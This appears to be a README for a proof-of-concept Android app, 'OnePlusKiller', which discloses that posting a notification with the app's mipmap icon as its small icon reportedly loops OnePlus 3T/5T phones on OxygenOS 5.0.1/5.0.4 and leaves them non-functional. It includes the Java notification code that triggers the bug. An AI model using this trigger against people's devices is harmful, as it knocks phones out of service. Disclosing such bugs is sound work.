# OnePlusKiller
This is a simple demo app that show how you can easily destroy OnePlus system (tested on 3T and 5T) running android 8.0.0 OxygenOS 5.0.1 or 5.0.4
This demo app will keep OnePlus in loop and the device won't be functional.

This lines of code make it happen:
``` java
    builder.setSmallIcon(R.mipmap.ic_launcher)
```


``` java
    private void sendNotification(String title, String content) {
        NotificationManager mNotificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        // Android O requires a Notification Channel.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = getString(R.string.app_name);
            // Create the channel for the notification
            NotificationChannel mChannel = new NotificationChannel(CHANNEL_ID, name, NotificationManager.IMPORTANCE_DEFAULT);
            // Set the Notification Channel for the Notification Manager.
            if (mNotificationManager != null) {
                mNotificationManager.createNotificationChannel(mChannel);
            }
        }
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID);
        // Define the notification settings.
        builder.setSmallIcon(R.mipmap.ic_launcher)
                .setContentTitle(title)
                .setContentText(content);
        // Dismiss notification once the user touches it.
        builder.setAutoCancel(true);
        // Issue the notification
        if (mNotificationManager != null) {
            mNotificationManager.notify(0, builder.build());
        }
    }
```

![Alt text](/Screenshot_20180320-092504.jpg "Screenshot")


